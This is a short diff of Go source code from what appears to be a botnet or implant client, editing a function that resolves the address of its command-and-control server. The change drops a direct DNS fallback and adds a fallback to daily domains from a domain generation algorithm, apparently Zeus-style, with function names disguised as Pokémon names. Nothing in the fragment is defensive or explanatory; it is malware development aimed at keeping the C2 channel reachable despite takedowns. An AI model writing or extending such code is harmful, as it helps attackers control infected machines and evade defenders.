@@ -503,18 +503,18 @@ func dialga() string {
 		return c2Addr
 	}
 
-	// Method 3: Fallback to A record (domain points directly to C2)
-	deoxys("dialga: TXT lookups failed, falling back to A record")
-	if ip, err := rayquaza(domain); err == nil && ip != "" {
-		result := fmt.Sprintf("%s:%s", ip, defaultPort)
-		deoxys("dialga: A record fallback success: %s", result)
-		return result
+	// Method 4: Fallback to DGA domains
+	deoxys("dialga: Direct domain resolution failed, trying DGA daily domains")
+	if dgaAddr := zeusDGAResolve(defaultPort); dgaAddr != "" {
+		deoxys("dialga: DGA resolution success: %s", dgaAddr)
+		return dgaAddr
 	}
 
 	// Last resort: return decoded value as-is
 	deoxys("dialga: All resolution methods failed, returning decoded: %s", decoded)
 	return decoded
 }
+
 
 // ============================================================================
 // C2 CONNECTION FUNCTIONS
